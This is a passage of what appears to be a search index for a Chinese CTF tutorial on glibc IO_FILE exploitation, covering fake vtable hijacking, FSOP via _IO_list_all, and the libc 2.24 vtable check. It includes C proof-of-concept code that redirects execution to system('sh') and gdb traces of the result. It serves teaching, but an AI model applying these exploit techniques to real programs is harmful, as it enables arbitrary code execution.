fwrite(\nhi\n,2,1,fp);\n}\n\n\n\n\n\u4f46\u662f\u5728\u76ee\u524dlibc2.23\u7248\u672c\u4e0b\uff0c\u4f4d\u4e8elibc\u6570\u636e\u6bb5\u7684vtable\u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684\u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020vtable\u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002\n\n\n#define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_addr,*fake_vtable;\n\n    fp=fopen(\n123.txt\n,\nrw\n);\n    fake_vtable=malloc(0x40);\n\n    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset\n\n    vtable_addr[0]=(long long)fake_vtable;\n\n    memcpy(fp,\nsh\n,3);\n\n    fake_vtable[7]=system_ptr; //xsputn\n\n    fwrite(\nhi\n,2,1,fp);\n}\n\n\n\n\n\u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e\u4f2a\u9020\u7684vtable\uff0c\u4e4b\u540e\u4fee\u6539_IO_FILE_plus\u7684vtable\u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58\u3002\u56e0\u4e3avtable\u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662fsystem\u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570\"/bin/sh\"\u6216\"sh\"\u3002\n\n\n\u56e0\u4e3avtable\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus\u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a\"sh\"\u5199\u5165_IO_FILE_plus\u5934\u90e8\u3002\u4e4b\u540e\u5bf9fwrite\u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684vtable\u6267\u884csystem(\"sh\")\u3002\n\n\n\u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728fopen\u7b49\u51fd\u6570\u521b\u5efa\u7684_IO_FILE\u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9stdin\\stdout\\stderr\u7b49\u4f4d\u4e8elibc.so\u4e2d\u7684_IO_FILE\uff0c\u8fd9\u4e9b\u6d41\u5728printf\\scanf\u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728libc2.23\u4e4b\u524d\uff0c\u8fd9\u4e9bvtable\u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002\n\n\nprint \n_IO_2_1_stdin_\n$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 \n_IO_2_1_stdin_\n\n\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so", 
            "title": "\u4f2a\u9020 vtable \u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/#vtable", 
            "text": "", 
            "title": "\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/#_1", 
            "text": "\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86Linux\u4e2d\u6587\u4ef6\u6d41\u7684\u7279\u6027\uff08FILE\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5Linux\u4e2d\u7684\u4e00\u4e9b\u5e38\u89c1\u7684IO\u64cd\u4f5c\u51fd\u6570\u90fd\u9700\u8981\u7ecf\u8fc7FILE\u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f_IO_FILE_plus\u7ed3\u6784\u4e2d\u5b58\u5728vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002  \u56e0\u6b64\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f\u9488\u5bf9_IO_FILE_plus\u7684vtable\u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628avtable\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002  \u56e0\u6b64vtable\u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6vtable\u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002", 
            "title": "\u7b80\u4ecb"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/#_2", 
            "text": "\u8fd9\u91cc\u6f14\u793a\u4e86\u4fee\u6539vtable\u4e2d\u7684\u6307\u9488\uff0c\u9996\u5148\u9700\u8981\u77e5\u9053_IO_FILE_plus\u4f4d\u4e8e\u54ea\u91cc\uff0c\u5bf9\u4e8efopen\u7684\u60c5\u51b5\u4e0b\u662f\u4f4d\u4e8e\u5806\u5185\u5b58\uff0c\u5bf9\u4e8estdin\\stdout\\stderr\u662f\u4f4d\u4e8elibc.so\u4e2d\u3002  int main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen( 123.txt , rw );\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    vtable_ptr[7]=0x41414141 //xsputn\n\n    printf( call 0x41414141 );\n}  \u6839\u636evtable\u5728_IO_FILE_plus\u7684\u504f\u79fb\u5f97\u5230vtable\u7684\u5730\u5740\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f0xd8\u3002\u4e4b\u540e\u9700\u8981\u641e\u6e05\u695a\u6b32\u52ab\u6301\u7684IO\u51fd\u6570\u4f1a\u8c03\u7528vtable\u4e2d\u7684\u54ea\u4e2a\u51fd\u6570\u3002\u5173\u4e8eIO\u51fd\u6570\u8c03\u7528vtable\u7684\u60c5\u51b5\u5df2\u7ecf\u5728FILE\u7ed3\u6784\u4ecb\u7ecd\u4e00\u8282\u7ed9\u51fa\u4e86\uff0c\u77e5\u9053\u4e86printf\u4f1a\u8c03\u7528vtable\u4e2d\u7684xsputn\uff0c\u5e76\u4e14xsputn\u7684\u662fvtable\u4e2d\u7b2c\u516b\u9879\u4e4b\u540e\u5c31\u53ef\u4ee5\u5199\u5165\u8fd9\u4e2a\u6307\u9488\u8fdb\u884c\u52ab\u6301\u3002  \u5e76\u4e14\u5728xsputn\u7b49vtable\u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684_IO_FILE_plus\u5730\u5740\u3002\u6bd4\u5982\u8fd9\u4f8b\u5b50\u8c03\u7528printf\uff0c\u4f20\u9012\u7ed9vtable\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f_IO_2_1_stdout_\u7684\u5730\u5740\u3002  \u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684vtable\u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982  #define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen( 123.txt , rw );\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    memcopy(fp, sh ,3);\n\n    vtable_ptr[7]=system_ptr //xsputn\n\n\n    fwrite( hi ,2,1,fp);\n}  \u4f46\u662f\u5728\u76ee\u524dlibc2.23\u7248\u672c\u4e0b\uff0c\u4f4d\u4e8elibc\u6570\u636e\u6bb5\u7684vtable\u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684\u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020vtable\u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002  #define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_addr,*fake_vtable;\n\n    fp=fopen( 123.txt , rw );\n    fake_vtable=malloc(0x40);\n\n    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset\n\n    vtable_addr[0]=(long long)fake_vtable;\n\n    memcpy(fp, sh ,3);\n\n    fake_vtable[7]=system_ptr; //xsputn\n\n    fwrite( hi ,2,1,fp);\n}  \u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e\u4f2a\u9020\u7684vtable\uff0c\u4e4b\u540e\u4fee\u6539_IO_FILE_plus\u7684vtable\u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58\u3002\u56e0\u4e3avtable\u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662fsystem\u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570\"/bin/sh\"\u6216\"sh\"\u3002  \u56e0\u4e3avtable\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus\u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a\"sh\"\u5199\u5165_IO_FILE_plus\u5934\u90e8\u3002\u4e4b\u540e\u5bf9fwrite\u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684vtable\u6267\u884csystem(\"sh\")\u3002  \u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728fopen\u7b49\u51fd\u6570\u521b\u5efa\u7684_IO_FILE\u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9stdin\\stdout\\stderr\u7b49\u4f4d\u4e8elibc.so\u4e2d\u7684_IO_FILE\uff0c\u8fd9\u4e9b\u6d41\u5728printf\\scanf\u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728libc2.23\u4e4b\u524d\uff0c\u8fd9\u4e9bvtable\u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002  print  _IO_2_1_stdin_\n$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0  _IO_2_1_stdin_ \n\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so", 
            "title": "\u5b9e\u8df5"
        }, 
        {
            "location": "/pwn/io_file/fsop/", 
            "text": "FSOP\n\n\n\u4ecb\u7ecd\n\n\nFSOP\u662fFile Stream Oriented Programming\u7684\u7f29\u5199\uff0c\u6839\u636e\u524d\u9762\u5bf9FILE\u7684\u4ecb\u7ecd\u5f97\u77e5\u8fdb\u7a0b\u5185\u6240\u6709\u7684_IO_FILE\u7ed3\u6784\u4f1a\u4f7f\u7528_chain\u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531_IO_list_all\u7ef4\u62a4\u3002\n\n\nFSOP\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301_IO_list_all\u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684_IO_FILE\u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP\u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528_IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0_IO_list_all\u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2aFILE\u8c03\u7528fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528_IO_FILE_plus.vtable\u4e2d\u7684_IO_overflow\u3002\n\n\nint\n_IO_flush_all_lockp (int do_lock)\n{\n  ...\n  fp = (_IO_FILE *) _IO_list_all;\n  while (fp != NULL)\n  {\n       ...\n       if (((fp-\n_mode \n= 0 \n fp-\n_IO_write_ptr \n fp-\n_IO_write_base))\n               \n _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }\n        ...\n  }\n}\n\n\n\n\n\n\n\u800c_IO_flush_all_lockp\u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a\n\n\n1.\u5f53libc\u6267\u884cabort\u6d41\u7a0b\u65f6\n\n\n2.\u5f53\u6267\u884cexit\u51fd\u6570\u65f6\n\n\n3.\u5f53\u6267\u884c\u6d41\u4ecemain\u51fd\u6570\u8fd4\u56de\u65f6\n\n\n\u793a\u4f8b\n\n\n\u68b3\u7406\u4e00\u4e0bFSOP\u5229\u7528\u7684\u6761\u4ef6\uff0c\u9996\u5148\u9700\u8981\u653b\u51fb\u8005\u83b7\u77e5libc.so\u57fa\u5740\uff0c\u56e0\u4e3a_IO_list_all\u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728libc.so\u4e2d\u7684\uff0c\u4e0d\u6cc4\u6f0flibc\u57fa\u5740\u5c31\u4e0d\u80fd\u6539\u5199_IO_list_all\u3002\n\n\n\u4e4b\u540e\u9700\u8981\u7528\u4efb\u610f\u5730\u5740\u5199\u628a_IO_list_all\u7684\u5185\u5bb9\u6539\u4e3a\u6307\u5411\u6211\u4eec\u53ef\u63a7\u5185\u5b58\u7684\u6307\u9488\uff0c\n\n\n\u4e4b\u540e\u7684\u95ee\u9898\u662f\u5728\u53ef\u63a7\u5185\u5b58\u4e2d\u5e03\u7f6e\u4ec0\u4e48\u6570\u636e\uff0c\u6beb\u65e0\u7591\u95ee\u7684\u662f\u9700\u8981\u5e03\u7f6e\u4e00\u4e2a\u6211\u4eec\u7406\u60f3\u51fd\u6570\u7684vtable\u6307\u9488\u3002\u4f46\u662f\u4e3a\u4e86\u80fd\u591f\u8ba9\u6211\u4eec\u6784\u9020\u7684fake_FILE\u80fd\u591f\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fd8\u9700\u8981\u5e03\u7f6e\u4e00\u4e9b\u5176\u4ed6\u6570\u636e\u3002\n\u8fd9\u91cc\u7684\u4f9d\u636e\u662f\u6211\u4eec\u524d\u9762\u7ed9\u51fa\u7684\n\n\nif (((fp-\n_mode \n= 0 \n fp-\n_IO_write_ptr \n fp-\n_IO_write_base))\n               \n _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }\n\n\n\n\n\u4e5f\u5c31\u662f\n\n\n\n\nfp-\n_mode \n= 0\n\n\nfp-\n_IO_write_ptr \n fp-\n_IO_write_base\n\n\n\n\n\u5728\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u6211\u4eec\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020\u7684vtable\u548c_IO_FILE_plus\u3002\n\u4e3a\u4e86\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u63d0\u524d\u83b7\u5f97\u4e86_IO_write_ptr\u3001_IO_write_base\u3001_mode\u7b49\u6570\u636e\u57df\u7684\u504f\u79fb\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u4f2a\u9020\u7684vtable\u4e2d\u6784\u9020\u76f8\u5e94\u7684\u6570\u636e\n\n\n#define _IO_list_all 0x7ffff7dd2520\n#define mode_offset 0xc0\n#define writeptr_offset 0x28\n#define writebase_offset 0x20\n#define vtable_offset 0xd8\n\nint main(void)\n{\n    void *ptr;\n    long long *list_all_ptr;\n\n    ptr=malloc(0x200);\n\n    *(long long*)((long long)ptr+mode_offset)=0x0;\n    *(long long*)((long long)ptr+writeptr_offset)=0x1;\n    *(long long*)((long long)ptr+writebase_offset)=0x0;\n    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);\n\n    *(long long*)((long long)ptr+0x100+24)=0x41414141;\n\n    list_all_ptr=(long long *)_IO_list_all;\n\n    list_all_ptr[0]=ptr;\n\n    exit(0);\n}\n\n\n\n\n\u6211\u4eec\u4f7f\u7528\u5206\u914d\u5185\u5b58\u7684\u524d0x100\u4e2a\u5b57\u8282\u4f5c\u4e3a_IO_FILE_plus\uff0c\u540e0x100\u4e2a\u5b57\u8282\u4f5c\u4e3avtable\uff0c\u5728vtable\u4e2d\u4f7f\u75280x41414141\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u4f2a\u9020\u7684_IO_overflow\u6307\u9488\u3002\n\n\n\u4e4b\u540e\uff0c\u8986\u76d6\u4f4d\u4e8elibc\u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all\uff0c\u628a\u5b83\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684_IO_FILE_plus\u3002\n\n\n\u901a\u8fc7\u8c03\u7528exit\u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7fflush\u83b7\u53d6_IO_list_all\u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a_IO_FILE_plus\u8c03\u7528\u5176\u4e2d\u7684_IO_overflow\n\n\n---\n call _IO_overflow\n[#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0)\n[#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup()\n[#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=\noptimized out\n, run_list_atexit=0x1)\n[#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=\noptimized out\n)\n[#4] 0x4005ce \u2192 Name: main()", 
            "title": "FSOP"
        }, 
        {
            "location": "/pwn/io_file/fsop/#fsop", 
            "text": "", 
            "title": "FSOP"
        }, 
        {
            "location": "/pwn/io_file/fsop/#_1", 
            "text": "FSOP\u662fFile Stream Oriented Programming\u7684\u7f29\u5199\uff0c\u6839\u636e\u524d\u9762\u5bf9FILE\u7684\u4ecb\u7ecd\u5f97\u77e5\u8fdb\u7a0b\u5185\u6240\u6709\u7684_IO_FILE\u7ed3\u6784\u4f1a\u4f7f\u7528_chain\u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531_IO_list_all\u7ef4\u62a4\u3002  FSOP\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301_IO_list_all\u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684_IO_FILE\u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP\u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528_IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0_IO_list_all\u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2aFILE\u8c03\u7528fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528_IO_FILE_plus.vtable\u4e2d\u7684_IO_overflow\u3002  int\n_IO_flush_all_lockp (int do_lock)\n{\n  ...\n  fp = (_IO_FILE *) _IO_list_all;\n  while (fp != NULL)\n  {\n       ...\n       if (((fp- _mode  = 0   fp- _IO_write_ptr   fp- _IO_write_base))\n                 _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }\n        ...\n  }\n}   \u800c_IO_flush_all_lockp\u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a  1.\u5f53libc\u6267\u884cabort\u6d41\u7a0b\u65f6  2.\u5f53\u6267\u884cexit\u51fd\u6570\u65f6  3.\u5f53\u6267\u884c\u6d41\u4ecemain\u51fd\u6570\u8fd4\u56de\u65f6", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/fsop/#_2", 
            "text": "\u68b3\u7406\u4e00\u4e0bFSOP\u5229\u7528\u7684\u6761\u4ef6\uff0c\u9996\u5148\u9700\u8981\u653b\u51fb\u8005\u83b7\u77e5libc.so\u57fa\u5740\uff0c\u56e0\u4e3a_IO_list_all\u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728libc.so\u4e2d\u7684\uff0c\u4e0d\u6cc4\u6f0flibc\u57fa\u5740\u5c31\u4e0d\u80fd\u6539\u5199_IO_list_all\u3002  \u4e4b\u540e\u9700\u8981\u7528\u4efb\u610f\u5730\u5740\u5199\u628a_IO_list_all\u7684\u5185\u5bb9\u6539\u4e3a\u6307\u5411\u6211\u4eec\u53ef\u63a7\u5185\u5b58\u7684\u6307\u9488\uff0c  \u4e4b\u540e\u7684\u95ee\u9898\u662f\u5728\u53ef\u63a7\u5185\u5b58\u4e2d\u5e03\u7f6e\u4ec0\u4e48\u6570\u636e\uff0c\u6beb\u65e0\u7591\u95ee\u7684\u662f\u9700\u8981\u5e03\u7f6e\u4e00\u4e2a\u6211\u4eec\u7406\u60f3\u51fd\u6570\u7684vtable\u6307\u9488\u3002\u4f46\u662f\u4e3a\u4e86\u80fd\u591f\u8ba9\u6211\u4eec\u6784\u9020\u7684fake_FILE\u80fd\u591f\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fd8\u9700\u8981\u5e03\u7f6e\u4e00\u4e9b\u5176\u4ed6\u6570\u636e\u3002\n\u8fd9\u91cc\u7684\u4f9d\u636e\u662f\u6211\u4eec\u524d\u9762\u7ed9\u51fa\u7684  if (((fp- _mode  = 0   fp- _IO_write_ptr   fp- _IO_write_base))\n                 _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }  \u4e5f\u5c31\u662f   fp- _mode  = 0  fp- _IO_write_ptr   fp- _IO_write_base   \u5728\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u6211\u4eec\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020\u7684vtable\u548c_IO_FILE_plus\u3002\n\u4e3a\u4e86\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u63d0\u524d\u83b7\u5f97\u4e86_IO_write_ptr\u3001_IO_write_base\u3001_mode\u7b49\u6570\u636e\u57df\u7684\u504f\u79fb\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u4f2a\u9020\u7684vtable\u4e2d\u6784\u9020\u76f8\u5e94\u7684\u6570\u636e  #define _IO_list_all 0x7ffff7dd2520\n#define mode_offset 0xc0\n#define writeptr_offset 0x28\n#define writebase_offset 0x20\n#define vtable_offset 0xd8\n\nint main(void)\n{\n    void *ptr;\n    long long *list_all_ptr;\n\n    ptr=malloc(0x200);\n\n    *(long long*)((long long)ptr+mode_offset)=0x0;\n    *(long long*)((long long)ptr+writeptr_offset)=0x1;\n    *(long long*)((long long)ptr+writebase_offset)=0x0;\n    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);\n\n    *(long long*)((long long)ptr+0x100+24)=0x41414141;\n\n    list_all_ptr=(long long *)_IO_list_all;\n\n    list_all_ptr[0]=ptr;\n\n    exit(0);\n}  \u6211\u4eec\u4f7f\u7528\u5206\u914d\u5185\u5b58\u7684\u524d0x100\u4e2a\u5b57\u8282\u4f5c\u4e3a_IO_FILE_plus\uff0c\u540e0x100\u4e2a\u5b57\u8282\u4f5c\u4e3avtable\uff0c\u5728vtable\u4e2d\u4f7f\u75280x41414141\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u4f2a\u9020\u7684_IO_overflow\u6307\u9488\u3002  \u4e4b\u540e\uff0c\u8986\u76d6\u4f4d\u4e8elibc\u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all\uff0c\u628a\u5b83\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684_IO_FILE_plus\u3002  \u901a\u8fc7\u8c03\u7528exit\u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7fflush\u83b7\u53d6_IO_list_all\u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a_IO_FILE_plus\u8c03\u7528\u5176\u4e2d\u7684_IO_overflow  ---  call _IO_overflow\n[#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0)\n[#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup()\n[#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp= optimized out , run_list_atexit=0x1)\n[#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status= optimized out )\n[#4] 0x4005ce \u2192 Name: main()", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/", 
            "text": "\u65b0\u7248\u672clibc\u4e0bIO_FILE\u7684\u5229\u7528\n\n\n\u4ecb\u7ecd\n\n\n\u5728\u6700\u65b0\u7248\u672c\u7684glibc\u4e2d(2.24)\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9IO_FILE_plus\u7684vtable\u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc\n\u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5vtable\u5730\u5740\u7684\u5408\u6cd5\u6027\u3002\n\n\n\u5982\u679cvtable\u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1abort\u3002\n\n\n\u9996\u5148\u4f1a\u9a8c\u8bc1vtable\u662f\u5426\u4f4d\u4e8e_IO_vtable\u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check\u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002\n\n\n\u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528vtable\u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0\n\n\n\u65b0\u7684\u5229\u7528\u6280\u672f\n\n\n\u5728vtable\u96be\u4ee5\u88ab